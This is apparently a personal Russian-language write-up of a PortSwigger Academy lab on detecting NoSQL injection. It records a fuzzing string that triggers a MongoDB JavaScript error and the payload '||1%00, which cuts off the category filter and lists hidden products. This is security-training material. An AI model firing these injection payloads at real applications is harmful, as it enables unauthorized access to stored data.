лаба https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection

задание:
выполните атаку с использованием NoSQL-инъекции, которая заставляет приложение отображать неизданные продукты

------

на сайте можно выбирать категории продуктов

вот оригинальный запрос

```http
GET /filter?category=Food+%26+Drink HTTP/2
Host: 0aa700d104395c1081d2532700d30083.web-security-academy.net
Cookie: session=eIamcBfjJJZaEvb9OisbmNweuvG229kZ
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa700d104395c1081d2532700d30083.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

делая тест запрос
```
GET /filter?category=Food+%26+Drink'"`{\r;$Foo}\n$Foo \\xYZ\u0000 HTTP/2
```

ответ 500

```q
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
```
сразу написано mongo

----------

зная , что тут mongo
иду вот сюда [[0_NoSQLi_theory]]
там есть теория по разведке для каждой NoSql бд

-----

делаю так:
GET /filter?category=%00 HTTP/ - просто 500 ошибка

GET /filter?category='||1%00 HTTP/ - СРАБОТАЛО

я просто обрезал выборку конкретных категорий и получил все категрии сразу

------

## вывод 

не было абсолютно никакой валидации символов!!!